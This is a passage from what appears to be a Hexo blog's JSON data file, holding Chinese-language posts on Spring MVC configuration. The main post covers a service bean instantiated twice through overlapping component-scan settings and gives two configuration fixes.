view-name=&quot;admin/index&quot;/&gt;</div></pre></td></tr></table></figure>\n<p>如果当前路径是/，则交给相应的视图解析器直接解析为视图<br>如：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"defaultViewResolver\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.web.servlet.view.InternalResourceViewResolver\"</span> <span class=\"attr\">p:order</span>=<span class=\"string\">\"2\"</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewClass\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"org.springframework.web.servlet.view.JstlView\"</span>/&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"contentType\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"text/html\"</span>/&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"prefix\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"/WEB-INF/jsp/\"</span>/&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"suffix\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\".jsp\"</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>则得到的视图是：/WEB-INF/jsp/admin/index.jsp</p>\n<h2 id=\"三、参考\"><a href=\"#三、参考\" class=\"headerlink\" title=\"三、参考\"></a>三、参考</h2><p><a href=\"http://www.iteye.com/topic/1129445\">http://www.iteye.com/topic/1129445</a></p>\n"},{"title":"spring mvc service实例化二次问题","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n描述：错误地spring容器配置，导致spring实例service二次。\n\n\n## 项目现状\n\n### web.xml配置\nweb容器，首先加载spring-beans.xml配置，再加载spring-mvc.xml配置。\n``` xml\n  <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:spring-beans.xml</param-value>\n  </context-param>\n\n  <!-- Creates the Spring Container shared by all Servlets and Filters -->\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n\n  <!-- Processes application requests -->\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>classpath:spring-mvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n```\n\n\n<!-- more -->\n\n\n### root spring配置\n**期望**通过注解实例化除Controller之外的对象。\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\">\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n### mvc spring配置\n**期望**通过注解实例化只有Controller的对象。\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n\n## 问题小析\n通过如此配置，发现spring在加载spring-beans.xml时，实例化了一次service，再加载spring-mvc.xml时，实例化了一次controller和一次service，导致spring先后总共实例化二次service的情况发生。\n\n### 解析方案1\nspring-mvc.xml扫描时，base-package设置更细粒度的子包。如：\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo.controller\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n此配置的含义：只扫描com.martinye.demo.controller包路径下子标签指明的类型，以及**默认的**@Component、@ManagedBean、@Named注解类型。\n\n**注**：子标签与注解类型冲突，以子标签配置为准。\n\n\n### 解析方案2\n设置use-default-filters值为false，其值默认为true。如：\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters＝\"false\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n此配置的含义：只扫描com.martinye.demo包路径下子标签指明的类型，不自动注册**默认的**@Component、@ManagedBean、@Named注解类型。\n\n**注**：子标签与注解类型冲突，以子标签配置为准。\n\n\n### 结语\n查阅了相关文档，发现：\n1. spring`<context:component-scan>`标签处理逻辑会交给org.springframework.context.config.ContextNamespaceHandler处理，然后季托ComponentScanBeanDefinitionParser会读取配置文件信息并组装成org.springframework.context.annotation.ClassPathBeanDefinitionScanner进行处理。\n2. context:component-scan的子标签，作用有先后顺序，越上面的子标签优先越高。\n3. use-default-filters为true时，实例化ClassPathBeanDefinitionScanner时，会调用registerDefaultFilters，include @Component、@ManagedBean、@Named注解类；否则不include。之后再添加include-filter和exclude-filter里的逻辑。\n\n\n\n## 参考文档\n- [context:component-scan扫描使用上的容易忽略的use-default-filters](http://jinnianshilongnian.iteye.com/blog/1762632)\n- [spring配置中<context:component-scan/>的use-default-filters的作用](http://liuluo129.iteye.com/blog/1943412)\n\n\n","source":"_posts/article/spring/spring mvc service实例化二次问题.md","raw":"categories:\n  - 后端开发\ntags:\n  - spring\n  - java\n  - mvc\n  - issue\ntitle: spring mvc service实例化二次问题\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n描述：错误地spring容器配置，导致spring实例service二次。\n\n\n## 项目现状\n\n### web.xml配置\nweb容器，首先加载spring-beans.xml配置，再加载spring-mvc.xml配置。\n``` xml\n  <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:spring-beans.xml</param-value>\n  </context-param>\n\n  <!-- Creates the Spring Container shared by all Servlets and Filters -->\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n\n  <!-- Processes application requests -->\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>classpath:spring-mvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n```\n\n\n<!-- more -->\n\n\n### root spring配置\n**期望**通过注解实例化除Controller之外的对象。\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\">\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n### mvc spring配置\n**期望**通过注解实例化只有Controller的对象。\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n\n## 问题小析\n通过如此配置，发现spring在加载spring-beans.xml时，实例化了一次service，再加载spring-mvc.xml时，实例化了一次controller和一次service，导致spring先后总共实例化二次service的情况发生。\n\n### 解析方案1\nspring-mvc.xml扫描时，base-package设置更细粒度的子包。如：\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo.controller\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n此配置的含义：只扫描com.martinye.demo.controller包路径下子标签指明的类型，以及**默认的**@Component、@ManagedBean、@Named注解类型。\n\n**注**：子标签与注解类型冲突，以子标签配置为准。\n\n\n### 解析方案2\n设置use-default-filters值为false，其值默认为true。如：\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters＝\"false\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n此配置的含义：只扫描com.martinye.demo包路径下子标签指明的类型，不自动注册**默认的**@Component、@ManagedBean、@Named注解类型。\n\n**注**：子标签与注解类型冲突，以子标签配置为准。\n\n\n### 结语\n查阅了相关文档，发现：\n1. spring`<context:component-scan>`标签处理逻辑会交给org.springframework.context.config.ContextNamespaceHandler处理，然后季托ComponentScanBeanDefinitionParser会读取配置文件信息并组装成org.springframework.context.annotation.ClassPathBeanDefinitionScanner进行处理。\n2. context:component-scan的子标签，作用有先后顺序，越上面的子标签优先越高。\n3. use-default-filters为true时，实例化ClassPathBeanDefinitionScanner时，会调用registerDefaultFilters，include @Component、@ManagedBean、@Named注解类；否则不include。之后再添加include-filter和exclude-filter里的逻辑。\n\n\n\n## 参考文档\n- [context:component-scan扫描使用上的容易忽略的use-default-filters](http://jinnianshilongnian.iteye.com/blog/1762632)\n- [spring配置中<context:component-scan/>的use-default-filters的作用](http://liuluo129.iteye.com/blog/1943412)\n\n\n","slug":"article/spring/spring mvc service实例化二次问题","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxu2005t5nbtubudtep7","content":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\"></p>\n<p>描述：错误地spring容器配置，导致spring实例service二次。</p>\n<h2 id=\"项目现状\"><a href=\"#项目现状\" class=\"headerlink\" title=\"项目现状\"></a>项目现状</h2><h3 id=\"web-xml配置\"><a href=\"#web-xml配置\" class=\"headerlink\" title=\"web.xml配置\"></a>web.xml配置</h3><p>web容器，首先加载spring-beans.xml配置，再加载spring-mvc.xml配置。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:spring-beans.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">listener</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class=\"tag\">&lt;/<span class=\"name\">listener-class</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">listener</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- Processes application requests --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h3 id=\"root-spring配置\"><a href=\"#root-spring配置\" class=\"headerlink\" title=\"root spring配置\"></a>root spring配置</h3><p><strong>期望</strong>通过注解实例化除Controller之外的对象。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"mvc-spring配置\"><a href=\"#mvc-spring配置\" class=\"headerlink\" title=\"mvc spring配置\"></a>mvc spring配置</h3><p><strong>期望</strong>通过注解实例化只有Controller的对象。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"问题小析\"><a href=\"#问题小析\" class=\"headerlink\" title=\"问题小析\"></a>问题小析</h2><p>通过如此配置，发现spring在加载spring-beans.xml时，实例化了一次service，再加载spring-mvc.xml时，实例化了一次controller和一次service，导致spring先后总共实例化二次service的情况发生。</p>\n<h3 id=\"解析方案1\"><a href=\"#解析方案1\" class=\"headerlink\" title=\"解析方案1\"></a>解析方案1</h3><p>spring-mvc.xml扫描时，base-package设置更细粒度的子包。如：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo.controller\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>此配置的含义：只扫描com.martinye.demo.controller包路径下子标签指明的类型，以及<strong>默认的</strong>@Component、@ManagedBean、@Named注解类型。</p>\n<p><strong>注</strong>：子标签与注解类型冲突，以子标签配置为准。</p>\n<h3 id=\"解析方案2\"><a href=\"#解析方案2\" class=\"headerlink\" title=\"解析方案2\"></a>解析方案2</h3><p>设置use-default-filters值为false，其值默认为true。如：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span> <span class=\"attr\">use-default-filters</span>＝\"<span class=\"attr\">false</span>\"&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>此配置的含义：只扫描com.martinye.demo包路径下子标签指明的类型，不自动注册<strong>默认的</strong>@Component、@ManagedBean、@Named注解类型。</p>\n<p><strong>注</strong>：子标签与注解类型冲突，以子标签配置为准。</p>\n<h3 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h3><p>查阅了相关文档，发现：</p>\n<ol>\n<li>spring<code>&lt;context:component-scan&gt;</code>标签处理逻辑会交给org.springframework.context.config.ContextNamespaceHandler处理，然后季托ComponentScanBeanDefinitionParser会读取配置文件信息并组装成org.springframework.context.annotation.ClassPathBeanDefinitionScanner进行处理。</li>\n<li>context:component-scan的子标签，作用有先后顺序，越上面的子标签优先越高。</li>\n<li>use-default-filters为true时，实例化ClassPathBeanDefinitionScanner时，会调用registerDefaultFilters，include @Component、@ManagedBean、@Named注解类；否则不include。之后再添加include-filter和exclude-filter里的逻辑。</li>\n</ol>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ul>\n<li><a href=\"http://jinnianshilongnian.iteye.com/blog/1762632\" target=\"_blank\" rel=\"external\">context:component-scan扫描使用上的容易忽略的use-default-filters</a></li>\n<li><a href=\"http://liuluo129.iteye.com/blog/1943412\" target=\"_blank\" rel=\"external\">spring配置中<context:component-scan>的use-default-filters的作用</context:component-scan></a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" /></p>\n<p>描述：错误地spring容器配置，导致spring实例service二次。</p>\n<h2 id=\"项目现状\"><a href=\"#项目现状\" class=\"headerlink\" title=\"项目现状\"></a>项目现状</h2><h3 id=\"web-xml配置\"><a href=\"#web-xml配置\" class=\"headerlink\" title=\"web.xml配置\"></a>web.xml配置</h3><p>web容器，首先加载spring-beans.xml配置，再加载spring-mvc.xml配置。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:spring-beans.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">listener</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class=\"tag\">&lt;/<span class=\"name\">listener-class</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">listener</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- Processes application requests --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>spring<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></div></pre></td></tr></table></figure></p>","more":"<h3 id=\"root-spring配置\"><a href=\"#root-spring配置\" class=\"headerlink\" title=\"root spring配置\"></a>root spring配置</h3><p><strong>期望</strong>通过注解实例化除Controller之外的对象。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"mvc-spring配置\"><a href=\"#mvc-spring配置\" class=\"headerlink\" title=\"mvc spring配置\"></a>mvc spring配置</h3><p><strong>期望</strong>通过注解实例化只有Controller的对象。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span 